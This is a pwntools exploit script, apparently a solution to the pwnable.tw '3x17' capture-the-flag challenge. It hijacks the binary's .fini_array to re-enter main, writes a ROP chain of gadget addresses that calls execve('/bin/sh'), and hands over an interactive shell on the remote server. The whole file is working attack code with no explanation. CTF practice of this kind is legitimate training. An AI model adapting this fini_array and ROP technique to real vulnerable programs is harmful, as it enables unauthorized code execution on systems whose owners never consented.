from pwn import *

exe = ELF('3x17', checksec = False)
#r = process(exe.path)
r = remote('chall.pwnable.tw', 10105)

main = 0x401B6D
fini_array = 0x4B40F0
fini_array_call = 0x402960

pop_rdi = 0x0000000000401696 #1
pop_rsi = 0x0000000000406c30 #2
pop_rdx = 0x0000000000446e35 #3
pop_rax = 0x000000000041e4af #4
syscall = 0x00000000004022b4 #5
leave = 0x0000000000401c4b
rw_section = fini_array + 11*8

def senddata(add, data):
    r.sendlineafter(b'addr:', str(add))
    r.sendafter(b'data:', data)

senddata(fini_array, p64(fini_array_call) + p64(main))
senddata(fini_array + 2*8, p64(pop_rdi) + p64(rw_section))
senddata(fini_array + 4*8, p64(pop_rsi) + p64(0))
senddata(fini_array + 6*8, p64(pop_rdx) + p64(0))
senddata(fini_array + 8*8, p64(pop_rax) + p64(0x3b))
senddata(fini_array + 10*8, p64(syscall) + b'/bin/sh\x00')
senddata(fini_array, p64(leave))
r.interactive()